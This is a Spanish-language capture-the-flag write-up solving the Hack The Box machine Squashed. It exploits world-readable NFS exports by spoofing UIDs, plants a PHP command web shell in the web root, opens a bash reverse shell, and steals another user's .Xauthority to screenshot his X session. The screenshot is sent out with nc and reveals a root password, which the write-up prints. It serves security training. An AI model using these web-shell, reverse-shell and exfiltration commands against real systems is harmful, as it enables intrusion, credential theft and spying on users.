---
title: HackTheBox - Squashed
categories: [Linux]
tags: [HackTheBox]
image: Squashed.png
img_path: /assets/HTB/Squashed/
---

En este post voy a explicar como resolver la máquina Squashed de [Hack The Box](https://app.hackthebox.com/machines/Squashed), en la cual vamos a estar ganando acceso a la máquina mediante una montura NFS conectada a un servidor web y para la escalada estaremos "abusando" del archivo .Xauthority.

## Escaneo de puertos

```
# nmap -p- -sS --min-rate 5000 -sCV -oN nmap -n -Pn 10.10.11.191
Nmap scan report for 10.10.11.191                                                                                                                                                           
Host is up (0.17s latency).
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA) 
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Built Better
|_http-server-header: Apache/2.4.41 (Ubuntu)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      40267/udp6  mountd
|   100005  1,2,3      47401/tcp   mountd
|   100005  1,2,3      57658/udp   mountd
|   100005  1,2,3      58699/tcp6  mountd
|   100021  1,3,4      33432/udp6  nlockmgr
|   100021  1,3,4      41909/udp   nlockmgr
|   100021  1,3,4      44325/tcp6  nlockmgr
|   100021  1,3,4      44543/tcp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
La máquina tiene abiertos los puertos 22 (SSH), 80 (HTTP), 111 (rpcbind) y 2049 (NFS).

# Enumeración

Al ingresar al servidor web que está alojado en el puerto ```80``` veremos esto.

<img src="puerto-80.png">

Es un sitio web totalmente estático, vamos a enumerar el puerto ```2049``` en el que está ejecutándose el servicio ```NFS```

NFS significa "Network File System". Es un protocolo de red que permite compartir archivos entre sistemas diferentes. Esto le permite a los usuarios acceder a archivos remotos como si fueran locales.

Una herramienta que podemos usar para enumerar los puntos de montaje NFS de una máquina remota es "showmount".

```sh
$ showmount -e 10.10.11.191
Export list for 10.10.11.191:
/home/ross    *
/var/www/html *
```

Nos aparece el directorio personal del usuario Ross y el directorio del servidor web, vamos a montárnoslo en nuestro sistema

```sh
$ cd /tmp                                                                                                                                                               
$ mkdir home-ross && mkdir web-html                                                                                                                                            
$ mount -t nfs 10.10.11.191:/home/ross home-ross
$ mount -t nfs 10.10.11.191:/var/www/html web-html
$ ls -l home-ross && ls -l web-html 

total 32
drwxr-xr-x 2 1001 1001 4096 oct 21 11:57 Desktop
drwxr-xr-x 2 1001 1001 4096 oct 21 11:57 Documents
drwxr-xr-x 2 1001 1001 4096 oct 21 11:57 Downloads
drwxr-xr-x 2 1001 1001 4096 oct 21 11:57 Music
drwxr-xr-x 2 1001 1001 4096 oct 21 11:57 Pictures
drwxr-xr-x 2 1001 1001 4096 oct 21 11:57 Public
drwxr-xr-x 2 1001 1001 4096 oct 21 11:57 Templates
drwxr-xr-x 2 1001 1001 4096 oct 21 11:57 Videos

total 0
?????????? ? ? ? ?            ? css
?????????? ? ? ? ?            ? images
?????????? ? ? ? ?            ? index.html
?????????? ? ? ? ?            ? js

```

Si intentamos ingresar a la montura del servidor web nos dirá que no tenemos permiso para entrar.

```
$ cd web-html 
cd: permiso denegado: web-html
```

Si listamos por permisos y propietarios de la montura del servidor web, veremos que solamente los usuarios que estén en el grupo "2017" tienen acceso.

```
$ ls -la .
drwxrwxrwt 19 root root     4096 ene 29 03:09 .
drwxr-xr-x 19 root root     4096 ene 27 13:42 ..
drwxr-xr-x 14 1001     1001 4096 ene 27 03:32 home-ross
drwxr-xr--  5 2017 www-data 4096 ene 29 03:05 web-html
```

Vamos a crear un usuario de prueba y lo agregaremos al grupo "2017"

```sh
$ sudo adduser test
$ sudo usermod -u 2017 test
$ su test                  
$ id
uid=2017(test) gid=1001(test) grupos=1001(test),100(users)
```

Ahora si intentamos ingresar al recurso veremos que podemos.

```sh
$ cd web-html/
$ ls
css  images  index.html  js
```

# Ganada de acceso

Al parecer en esta montura está conectada al servidor web del puerto 80 de la máquina víctima, intentemos crear un archivo de prueba para ver si se refleja en la web.

```
$ echo "Test" > test.txt
```

<img src="test-txt.png">

Vamos a intentar subir un archivo en PHP, para ver si se interpreta.

```
$ echo '<?php echo "PHP Enabled"; ?>' > test.php
```

<img src="test-php.png">

Genial, como vemos la página interpreta código PHP, vamos a subir un archivo el cual nos permita ejecutar comandos mediante el parametro "?cmd" para así ganar acceso a la máquina.

```
$ echo -e '<?php\n  system($_REQUEST['cmd']);\n?>' > cmd.php
```

<img src="cmd.png">

Para hacernos la reverse shell usaremos el siguiente oneline de bash.

- bash -c 'bash -i >& /dev/tcp/IP/PUERTO 0>&1'

<img src="reverse-shell.png">

# Enumeración del sistema

Al ganar acceso, lo ganamos como el usuario "alex"

Si recordamos, teníamos una montura como el usuario "ross", si listamos los recursos ocultos de esa montura, veremos que hay un archivo llamado .Xauthority.

```sh
$ cd /tmp/home-ross
$ ls -la
total 68
drwxr-xr-x 14 1001 test 4096 ene 27 03:32 .
drwxrwxrwt 19 root root 4096 ene 29 03:47 ..
lrwxrwxrwx  1 root root    9 oct 20 10:24 .bash_history -> /dev/null
drwx------ 11 1001 test 4096 oct 21 11:57 .cache
drwx------ 12 1001 test 4096 oct 21 11:57 .config
drwxr-xr-x  2 1001 test 4096 oct 21 11:57 Desktop
drwxr-xr-x  2 1001 test 4096 oct 21 11:57 Documents
drwxr-xr-x  2 1001 test 4096 oct 21 11:57 Downloads
drwx------  3 1001 test 4096 oct 21 11:57 .gnupg
drwx------  3 1001 test 4096 oct 21 11:57 .local
drwxr-xr-x  2 1001 test 4096 oct 21 11:57 Music
drwxr-xr-x  2 1001 test 4096 oct 21 11:57 Pictures
drwxr-xr-x  2 1001 test 4096 oct 21 11:57 Public
drwxr-xr-x  2 1001 test 4096 oct 21 11:57 Templates
drwxr-xr-x  2 1001 test 4096 oct 21 11:57 Videos
lrwxrwxrwx  1 root root    9 oct 21 10:07 .viminfo -> /dev/null
-rw-------  1 1001 test   57 ene 27 03:32 .Xauthority
-rw-------  1 1001 test 2475 ene 27 03:32 .xsession-errors
-rw-------  1 1001 test 2475 dic 27 12:33 .xsession-errors.old
```

Si lo intentamos listar nos dirá que no tenemos permiso para hacerlo.

```
$ cat .Xauthority 
cat: .Xauthority: Permiso denegado
```

Pero podemos hacer lo mismo que hicimos para poder acceder a la montura que estaba corriendo el servidor web, nos crearemos un segundo usuario y lo agregaremos al grupo 1001.

```sh
$ sudo adduser test2
$ sudo usermod -u 1001 test2
$ su test2
$ cat .Xauthority 

squashed.htb0MIT-MAGIC-COOKIE-1'tmӡb25`{
```

El archivo ".Xauthority" es un archivo que contiene información de autenticación para el servidor X Window. El servidor X Window es el sistema que proporciona el entorno gráfico en sistemas operativos Linux y Unix.

Vamos a pasarnos el archivo .Xauthority del usuario ross, al directorio personal del usuario alex.

```
alex@squashed:/home/alex$ wget http://10.10.14.116:8080/.Xauthority
Saving to: ‘.Xauthority’
2023-01-29 07:21:36 (360 B/s) - ‘.Xauthority’ saved [57/57]
```

```
$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.11.191 - - [29/Jan/2023 04:21:39] "GET /.Xauthority HTTP/1.1" 200 -
```

# Escalada de privilegios

Si usamos el comando "w", podremos listar quienes están conectados a nuestra sesión.

```
alex@squashed:/home/alex$ w
 07:26:44 up 2 days, 54 min,  1 user,  load average: 0.05, 0.03, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ross     tty7     :0               Fri06    2days  6:34   0.04s /usr/libexec/gnome-session-binary --systemd --session=gnome
```

Vemos que el usuario ross está conectado y está usando la pantalla ":0", ya que tenemos su archivo .Xauthority, intentemos hacerle una captura de pantalla.

```
alex@squashed:/tmp$ XAUTHORITY=/home/alex/.Xauthority xwd -root -screen -silent -display :0 > screenshot.xwd
alex@squashed:/tmp$ file screenshot.xwd 
screenshot.xwd: XWD X Window Dump image data, "xwdump", 800x600x24
```

Perfecto, le pudimos sacar una captura de pantalla, vamos a transferirnos el archivo a nuestra máquina.

```
$ nc -lvnp 4646 > screenshot.xwd
```

```
alex@squashed:/tmp$ cat screenshot.xwd | nc 10.10.14.116 4646
```

```
$ nc -lnvp 4646 > screenshot.xwd
Listening on 0.0.0.0 4646
Connection received on 10.10.11.191 36294
$ file screenshot.xwd
screenshot.xwd: XWD X Window Dump image data, "xwdump", 800x600x24
```

Ahora para convertir este archivo en una imagen vamos a hacer uso del comando "convert" (instalar con "sudo apt install imagemagick")

```
$ convert screenshot.xwd screenshot.png
$ file screenshot.png
screenshot.png: PNG image data, 800 x 600, 8-bit/color RGB, non-interlaced
```

Si visualizamos el contenido de la imagen veremos que se ve la ventana del KeePassXC donde se ve la contraseña del usuario root.

<img src="keepass.png">

```
alex@squashed:/tmp$ su root
Password: cah$mei7rai9A

root@squashed:/tmp# whoami
root
```
